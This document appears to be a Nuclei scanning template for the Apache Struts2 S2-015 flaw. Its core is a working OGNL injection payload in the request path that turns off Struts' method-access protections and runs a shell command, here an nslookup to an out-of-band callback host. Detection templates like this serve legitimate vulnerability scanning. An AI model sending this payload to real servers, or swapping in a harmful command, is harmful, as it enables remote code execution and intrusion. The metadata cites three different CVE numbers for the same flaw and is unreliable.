id: CVE-2013-2134

info:
  name: Apache Struts2 S2-015
  author: JohnnieWalker
  severity: critical 
  description: Allows remote attackers to execute arbitrary OGNL code via a request with a crafted action name that is not properly handled during wildcard matching. This vulnerability combines two issues requested action name white-listing is not used and if TextParseUtil.translateVariables starts with $ and % characters combination, parameter value is processed as OGNL expression  
  reference: 
    - https://cwiki.apache.org/confluence/display/WW/S2-015
    - https://nvd.nist.gov/vuln/detail/CVE-2013-2314
    - https://access.redhat.com/security/cve/cve-2013-2134
    - https://waf.ninja/struts2-vulnerability-evolution/#s2032
  classification:
    cve-id: CVE-2013-2135
  tags: cve,cve2013,apache,struts,ognlexploited

requests:
  - method: GET
    path:
      - "{{BaseURL}}/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('nslookup {{interactsh-url}}').getInputStream())}.action"
    
    matchers-condition: and
    matchers:

      - type: status
        status:
          - 404
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

      